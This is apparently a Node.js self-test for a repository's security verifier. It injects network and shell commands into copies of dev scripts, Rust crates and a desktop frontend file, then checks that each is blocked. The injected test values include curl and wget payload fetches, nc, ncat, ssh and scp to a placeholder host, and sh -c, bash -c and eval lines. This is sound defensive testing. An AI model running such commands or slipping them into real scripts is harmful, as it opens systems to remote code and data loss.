import {
  appendFileSync,
  cpSync,
  mkdtempSync,
  rmSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, relative } from "node:path";
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";

const repoRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
const temporaryRoot = mkdtempSync(join(tmpdir(), "jzmatrix-static-boundary-"));
const verifierRelativePath = "scripts/verify-p1a.mjs";

function shouldCopy(source) {
  const path = relative(repoRoot, source).replaceAll("\\", "/");
  return !(
    path === ".git" ||
    path.startsWith(".git/") ||
    path === "node_modules" ||
    path.startsWith("node_modules/") ||
    path === "target" ||
    path.startsWith("target/") ||
    path.endsWith("/dist") ||
    path.includes("/dist/")
  );
}

function copyCase(name) {
  const caseRoot = join(temporaryRoot, name);
  cpSync(repoRoot, caseRoot, { recursive: true, filter: shouldCopy });
  return caseRoot;
}

function runVerifier(caseRoot) {
  const result = spawnSync(process.execPath, [join(caseRoot, verifierRelativePath)], {
    cwd: caseRoot,
    encoding: "utf8",
  });
  let output;
  try {
    output = JSON.parse(result.stdout);
  } catch (error) {
    throw new Error(
      `verifier did not return JSON (exit ${result.status}): ${result.stderr || error.message}`,
    );
  }
  return { status: result.status, output };
}

function assertBaselinePasses() {
  const caseRoot = copyCase("baseline");
  const result = runVerifier(caseRoot);
  if (result.status !== 0 || result.output.ok !== true) {
    throw new Error("baseline bootstrap.sh and doctor.sh must pass the declared development-script policy");
  }
}

function assertInjectionBlocks({ name, path, injection, checkId }) {
  const caseRoot = copyCase(name);
  appendFileSync(join(caseRoot, path), `\n${injection}\n`);
  const result = runVerifier(caseRoot);
  const check = result.output.checks?.find((entry) => entry.id === checkId);
  if (result.status === 0 || result.output.ok !== false || check?.status !== "blocked") {
    throw new Error(`${name} must block ${checkId}`);
  }
}

const developmentScriptCases = [
  ["curl", "curl https://example.invalid/payload"],
  ["wget", "wget https://example.invalid/payload"],
  ["nc", "nc example.invalid 443"],
  ["ncat", "ncat example.invalid 443"],
  ["ssh", "ssh example.invalid"],
  ["scp", "scp payload example.invalid:/tmp/payload"],
  ["sh-c", 'sh -c "echo injected"'],
  ["bash-c", 'bash -c "echo injected"'],
  ["eval", 'eval "echo injected"'],
  ["exec-sh", "exec sh ./untrusted.sh"],
];

try {
  assertBaselinePasses();
  for (const [name, injection] of developmentScriptCases) {
    assertInjectionBlocks({
      name: `dev-${name}`,
      path: "scripts/doctor.sh",
      injection,
      checkId: "security.dev_scripts_no_unapproved_network_or_shell",
    });
  }
  assertInjectionBlocks({
    name: "runtime-rust-command",
    path: "crates/matrix-core/src/lib.rs",
    injection: 'fn injected_process_start() { let _ = std::process::Command::new("sh"); }',
    checkId: "security.no_runtime_network_or_shell",
  });
  assertInjectionBlocks({
    name: "tool-discovery-shell-command",
    path: "crates/matrix-core/src/tool_discovery.rs",
    injection: '/* Command::new("sh") */',
    checkId: "security.tool_discovery_allowlist",
  });
  assertInjectionBlocks({
    name: "runtime-frontend-fetch",
    path: "apps/desktop/src/main.ts",
    injection: 'fetch("https://example.invalid");',
    checkId: "security.no_runtime_network_or_shell",
  });
  console.log(
    JSON.stringify({
      contract: "jzmatrix.static-boundary-self-test",
      version: "1.0.0",
      ok: true,
      cases: 14,
    }),
  );
} finally {
  rmSync(temporaryRoot, { recursive: true, force: true });
}
